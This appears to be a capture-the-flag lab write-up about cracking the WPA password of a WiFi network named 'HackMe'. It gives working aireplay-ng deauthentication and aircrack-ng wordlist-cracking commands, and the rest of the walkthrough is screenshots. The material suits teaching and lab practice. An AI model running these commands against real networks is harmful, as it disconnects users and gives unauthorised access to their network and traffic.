# [The Traditional WPA Password Attack](The%20Traditional%20WPA%20Password%20Attack.md)
### What is the password for the WiFi network named HackMe?

```sh
airodump-ng -c 1 -w WPA wlan0mon
```

![](Screenshot%202026-09-23%20at%2008.26.33.png)

```sh
aireplay-ng -0 5 -a D8:D6:3D:EB:29:D5 -c 96:BA:12:0C:7C:08 wlan0mon
```

After running aireplay-ng, we can see that the WPA handshake appeared

![](Screenshot%202026-09-23%20at%2008.29.40.png)

Now, let's crack the password from .cap file

```sh
aircrack-ng WPA-02.cap -w /opt/wordlist.txt 
```

![](Screenshot%202026-09-23%20at%2008.32.53.png)
### Connect to the WiFi network and submit the flag found at IP 192.168.1.1.

![](Screenshot%202026-09-23%20at%2008.40.20.png)

![](Screenshot%202026-09-23%20at%2008.40.56.png)